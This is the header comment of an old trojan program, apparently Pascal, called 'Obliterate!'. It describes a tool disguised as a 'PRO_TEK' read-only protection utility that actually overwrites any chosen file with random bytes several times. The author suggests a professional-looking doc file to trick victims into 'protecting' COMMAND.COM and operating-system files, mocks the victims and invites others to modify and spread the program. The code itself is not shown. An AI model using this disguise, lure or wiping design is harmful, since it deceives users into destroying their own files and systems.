{   Trojan - Obliterate!; }

{  This phile is designed to garble and erase any file that the user
   wants to make "Read-Only" (thats the hook). It does so by writing over
   the file with random byte values, multiple times.
   The looser thinks this is a protection scheme (named PRO_TEK
   or some shit). Whatever is the file name entered is really GONE!
   The trick issue is to develop a doc file that explains 'professionally'
   that the permanent write-protection of this program is IDEAL for files
   like COMMAND.COM, all of the looser's OS, etc.	
   Designed by: *** SaNDoZ ***  {Super Read-Only utility - hahahahah}

{   i know it's grossly simple but it's a riot!
   Note: like Norton's WipeDisk once it's gone, IT'S GONE! It's really vicious.
   Any party may make modifications to this as they see fit, just make sure
   that I can get a copy of it if it's really cool.  If you have any
   questions/comments I can be reached occasionally on Buck 'an Ear.
